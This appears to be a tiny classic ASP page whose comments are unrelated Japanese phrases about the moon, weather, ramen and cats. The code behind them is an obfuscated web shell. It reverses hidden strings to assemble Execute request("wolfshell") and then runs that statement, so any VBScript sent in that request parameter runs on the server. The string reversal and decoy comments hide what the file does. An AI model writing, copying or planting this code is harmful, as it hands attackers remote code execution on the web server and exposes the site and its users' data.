<%
' 月が綺麗ですね
Dim str_a1_rev, str_b2_rev, str_c3_rev, template_str, final_cmd_z9

' 今日の天気は晴れです
str_a1_rev = "etucexE"
str_b2_rev = "tseuqer"
str_c3_rev = "llehsflow"

' ラーメンを食べたい
template_str = "ACTION_ITEM TARGET_ITEM(PARAM_ITEM)"
template_str = Replace(template_str, "ACTION_ITEM", StrReverse(str_a1_rev))
template_str = Replace(template_str, "TARGET_ITEM", StrReverse(str_b2_rev))
template_str = Replace(template_str, "PARAM_ITEM", """" & StrReverse(str_c3_rev) & """")

' お腹がすきました
final_cmd_z9 = template_str

' 猫はかわいい
Execute(final_cmd_z9)
%>